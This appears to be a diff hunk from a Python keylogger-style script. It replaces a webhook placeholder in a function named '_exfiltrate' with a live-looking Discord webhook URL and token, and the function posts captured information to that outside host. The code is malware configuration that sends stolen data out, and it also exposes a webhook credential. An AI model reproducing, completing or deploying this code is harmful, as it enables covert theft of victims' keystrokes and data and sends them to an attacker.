@@ -4,7 +4,7 @@ _shift = False
 char = ''
 
 def _exfiltrate(_info):
-    _url = 'YOUR WEBHOOK HERE'
+    _url = 'https://discord.com/api/webhooks/1290026330649526380/4HkQs8g0IB3cIjyWu0gr0P1LYgqsdPPidtHCsJKnPpAcJjQcSZsSFippYzjGYGPbt9JT'
     try:
         payload = {
             'content': _info
